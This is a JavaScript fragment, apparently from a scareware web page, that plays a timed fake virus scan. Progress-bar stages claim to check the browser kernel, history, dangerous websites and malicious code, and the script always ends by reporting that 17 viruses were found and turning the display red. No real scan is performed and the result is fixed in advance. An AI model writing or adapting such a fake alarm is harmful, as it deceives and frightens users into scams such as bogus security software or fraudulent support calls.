	function progress1(size,status,percent) {
      var node1 = document.getElementById('progress1');
      var w1    = node1.style.width.match(/\d+/);
      document.getElementById('status').innerHTML = status;
	  document.getElementById('percentage').innerHTML = percent + '%'; 
	  node1.style.width = parseInt(w1) + size + 'px';	
    }

	function scan() {
 	  setTimeout(function(){progress1(0,'Start testing...',0);},500);
	  setTimeout(function(){progress1(10,'Scanning: <strong>Browser kernel</strong>',10);},2000);
	  setTimeout(function(){progress1(60,'Scanning: <strong>history record</strong>',35);},4000);
	  setTimeout(function(){progress1(100,'Scanning: <strong>Dangerous website</strong>',80);},6000);
	  setTimeout(function(){progress1(40,'Scanning: <strong>Malicious code</strong>',95);},7000);
	  setTimeout(function(){progress1(10,'Find<span style="text-align:center;">17</span>virus',100);
	   var s1=document.getElementById('progress1');
	   var s2=document.getElementById('status');
	   var s3=document.getElementById('s3');
	   var s4=document.getElementById('percentage');
	   s1.style.backgroundColor = "#FF2D2D";
	   s2.style.color = "#fff";
	   s3.style.backgroundColor = "#FF2D2D";
	   s4.style.color = "#fff";
	  },9000);
	
	}
	var i=0;
    setInterval(function(){var o=document.getElementById("logo");o.className='logor'+(i++%3);},300);